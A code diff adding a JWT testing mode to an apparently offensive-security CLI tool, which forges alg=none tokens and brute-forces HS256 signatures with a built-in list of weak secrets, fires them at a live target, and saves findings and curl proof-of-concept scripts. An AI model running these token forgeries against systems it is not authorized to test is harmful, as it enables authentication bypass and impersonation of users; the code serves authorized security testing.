@@ -72,6 +72,8 @@ import hashlib
 import secrets
 import statistics
 import concurrent.futures
+import base64
+import hmac
 from datetime import datetime
 from pathlib import Path
 from urllib.parse import urlsplit, urlunsplit, parse_qsl, quote
@@ -1901,6 +1903,214 @@ def _run_script_mode(args, console, eng):
     _show_script_result(console, eng, result)
 
 
+# ---------------------------------------------------------------------------
+# JWT testing (--jwt TOKEN) — a real token supplied by the operator, not
+# discovered automatically. Unlike every other check in this file, the
+# engine has no login flow of its own to obtain a session token from, so
+# this is an explicit mode like --script/--ai-script rather than an
+# automatic per-target check.
+# ---------------------------------------------------------------------------
+
+_JWT_WEAK_SECRETS = [
+    "secret", "password", "123456", "changeme", "supersecret",
+    "jwt_secret", "your-256-bit-secret", "admin", "secret123", "test",
+]  # "your-256-bit-secret" is jwt.io's own example secret in its docs —
+   # left unchanged by developers who copy-paste from there often enough
+   # to be worth a dedicated entry, not just a generic guess.
+
+
+def _b64url_decode(segment):
+    padding = "=" * (-len(segment) % 4)
+    return base64.urlsafe_b64decode(segment + padding)
+
+
+def _b64url_encode(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+
+def _jwt_parse(token):
+    """Decode header+payload without verifying anything — reading the
+    claims needs no signature check, that's the whole reason a compact JWT
+    can be decoded client-side. Returns (header, payload) dicts."""
+    parts = token.split(".")
+    if len(parts) < 2:
+        raise ValueError("not enough '.'-separated segments to be a JWT")
+    header = json.loads(_b64url_decode(parts[0]))
+    payload = json.loads(_b64url_decode(parts[1]))
+    return header, payload
+
+
+def _jwt_forge_none(payload):
+    header = {"alg": "none", "typ": "JWT"}
+    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+    return f"{h}.{p}."
+
+
+def _jwt_forge_hs256(payload, secret):
+    header = {"alg": "HS256", "typ": "JWT"}
+    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
+    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+    signing_input = f"{h}.{p}".encode()
+    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
+    return f"{h}.{p}.{_b64url_encode(sig)}"
+
+
+def _run_jwt_mode(args, console, eng, jwt_token):
+    Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()
+    if not HAS_REQUESTS:
+        console.print("[red]--jwt sends live HTTP requests and requires the 'requests' "
+                      "library.[/red]")
+        return
+
+    target_url = getattr(args, "target", None) or eng.get("target")
+    if not target_url:
+        console.print("[red]No target URL — pass one positionally along with --jwt, e.g. "
+                      "hakuza active \"https://target.tld/api/profile\" --jwt eyJ...[/red]")
+        return
+
+    try:
+        header, payload = _jwt_parse(jwt_token)
+    except Exception as e:
+        console.print(f"[red]Could not parse the supplied token as a JWT: "
+                      f"{_rich_escape(str(e))}[/red]")
+        return
+
+    console.print(Panel(
+        f"[bold]Header:[/bold]  {_rich_escape(json.dumps(header))}\n"
+        f"[bold]Payload:[/bold] {_rich_escape(json.dumps(payload))}",
+        title="hakuza active --jwt — parsed token", border_style="cyan", expand=False,
+    ))
+
+    timeout = getattr(args, "timeout", 10) or 10
+
+    def _try_token(token):
+        try:
+            return requests.get(target_url, timeout=timeout,
+                                headers={**_UA_HEADERS, "Authorization": f"Bearer {token}"})
+        except Exception:
+            return None
+
+    resp_real = _try_token(jwt_token)
+    if resp_real is None:
+        console.print("[red]Could not reach the target with the real token — aborting.[/red]")
+        return
+    real_body = resp_real.text or ""
+
+    try:
+        resp_unauth = requests.get(target_url, timeout=timeout, headers=_UA_HEADERS)
+        unauth_body = resp_unauth.text or ""
+        unauth_status = resp_unauth.status_code
+    except Exception:
+        unauth_body, unauth_status = "", None
+
+    # If a request with NO token at all already looks the same as the real,
+    # genuinely-authenticated one, this endpoint isn't gating on the token
+    # in the first place — there's nothing for a forged token to "bypass".
+    # Reporting one here would be a false claim, not a real finding
+    # (confirmed as a real failure mode directly: testlab's own
+    # /api/account doesn't check Authorization at all, and without this
+    # guard both JWT checks below false-positived against it).
+    if unauth_status == resp_real.status_code:
+        baseline_vs_unauth = difflib.SequenceMatcher(None, real_body, unauth_body).ratio()
+        if baseline_vs_unauth > 0.95:
+            console.print(
+                "[yellow]A request with NO Authorization header at all already looks "
+                "identical to the request with your real token — this endpoint doesn't "
+                "appear to enforce authentication via this token at all, so there's "
+                "nothing for a forged token to bypass. Skipping alg=none/weak-secret "
+                "checks (they would be meaningless here, not evidence of anything).[/yellow]"
+            )
+            return
+
+    def _looks_authenticated(resp):
+        """A forged token's response is treated as "accepted" only if it
+        resembles the REAL authenticated response more than it resembles
+        the unauthenticated one — not just "got a 200", since plenty of
+        apps return 200 with a login page for unauthenticated requests
+        too."""
+        if resp is None or resp.status_code >= 400:
+            return False
+        body = resp.text or ""
+        if _DENIAL_PHRASE_RE.search(body):
+            return False
+        ratio_real = difflib.SequenceMatcher(None, real_body, body).ratio()
+        ratio_unauth = difflib.SequenceMatcher(None, unauth_body, body).ratio() if unauth_body else 0.0
+        return ratio_real > 0.7 and ratio_real >= ratio_unauth
+
+    findings = []
+
+    none_token = _jwt_forge_none(payload)
+    if _looks_authenticated(_try_token(none_token)):
+        findings.append((
+            "alg=none signature bypass", none_token, "critical",
+            "The server accepted a JWT with the header's alg field set to \"none\" and no "
+            "signature segment at all — a complete authentication bypass. Any claims "
+            "(user ID, role, permissions) in the payload can be forged freely with zero "
+            "cryptographic verification.",
+            "Reject alg=none explicitly, or better, use a library/config that only ever "
+            "accepts one specific expected algorithm rather than trusting the token's own "
+            "declared alg header.",
+        ))
+
+    cracked_secret = None
+    for secret in _JWT_WEAK_SECRETS:
+        forged = _jwt_forge_hs256(payload, secret)
+        if _looks_authenticated(_try_token(forged)):
+            cracked_secret = secret
+            findings.append((
+                f"weak HS256 signing secret ('{secret}')", forged, "critical",
+                f"The JWT's HS256 signature was forgeable using a common weak secret "
+                f"('{secret}') from a small built-in list ({len(_JWT_WEAK_SECRETS)} tried) — "
+                f"complete signature forgery, any claims can be set arbitrarily.",
+                "Use a genuinely random, high-entropy secret (32+ bytes from a real CSPRNG), "
+                "generated per-deployment, never a memorable word or the value from a "
+                "tutorial/example.",
+            ))
+            break  # one cracked secret is enough evidence
+
+    if not findings:
+        console.print("[green]No alg=none bypass and no match against the built-in weak-secret "
+                      "list. This does not mean the JWT implementation is secure — only that "
+                      "these two specific, fast checks didn't find anything.[/green]")
+        return
+
+    for title_suffix, forged_token, severity, description, remediation in findings:
+        console.print(f"  [bold red]CONFIRMED[/bold red] JWT: {_rich_escape(title_suffix)}")
+        finding = _add_finding(
+            eng["id"],
+            title=f"JWT — {title_suffix}",
+            severity=severity,
+            category="JWT Authentication Bypass",
+            url=target_url,
+            description=(
+                description +
+                "\n\nVerified live: the forged token was sent to the real target and the "
+                "response matched the genuinely-authenticated baseline, not the "
+                "unauthenticated one."
+            ),
+            evidence=f"Forged token:\n{forged_token}\n\nOriginal payload:\n{json.dumps(payload, indent=2)}",
+            impact="Full authentication bypass — arbitrary claims (user ID, role, permissions) can be forged.",
+            remediation=remediation,
+            tool="hakuza-active",
+        )
+        console.print(f"  [dim]Saved as [{finding['short_id']}][/dim]")
+
+        if HAS_ACTIVE_AI:
+            try:
+                curl_cmd = gen_curl_poc("GET", target_url, {},
+                                        headers={"Authorization": f"Bearer {forged_token}"})
+                artifacts_dir = _n("ENGAGEMENTS_DIR") / eng["name"] / "artifacts"
+                artifacts_dir.mkdir(parents=True, exist_ok=True)
+                poc_path = artifacts_dir / f"poc_{finding['short_id']}.sh"
+                poc_path.write_text(f"#!/bin/sh\n{curl_cmd}\n", encoding="utf-8")
+                _add_artifact(eng["id"], artifact_type="poc-script", filename=poc_path.name,
+                             filepath=str(poc_path), tool="hakuza-active")
+                console.print(f"  [dim]PoC:[/dim] {poc_path}")
+            except Exception as e:
+                console.print(f"  [dim]PoC generation failed: {_rich_escape(str(e))}[/dim]")
+
+
 def _run_ai_script_mode(args, console, eng, description):
     Panel, Rule, Table, Prompt, Confirm, Syntax, box = _rich()
     if not HAS_ACTIVE_AI:
@@ -2064,11 +2274,15 @@ def cmd_active(args, console) -> None:
 
     script_path = getattr(args, "script", None)
     ai_script_desc = getattr(args, "ai_script", None)
+    jwt_token = getattr(args, "jwt", None)
     if script_path:
         _run_script_mode(args, console, eng)
         return
     if ai_script_desc:
         _run_ai_script_mode(args, console, eng, ai_script_desc)
+        return
+    if jwt_token:
+        _run_jwt_mode(args, console, eng, jwt_token)
         return
 
     depth = getattr(args, "depth", "quick") or "quick"
@@ -2229,6 +2443,10 @@ def register_argparse(sub):
                           help="Have Claude draft a Python test script from a description; the "
                                "full script is shown and requires explicit confirmation before "
                                "it is ever executed")
+    p_active.add_argument("--jwt", default=None, metavar="TOKEN",
+                          help="Test a JWT for alg=none bypass and weak-secret HS256 brute force "
+                               "against the target (sent as Authorization: Bearer <token>) — "
+                               "requires a real token, the engine has no login flow of its own")
 
 
 # ---------------------------------------------------------------------------
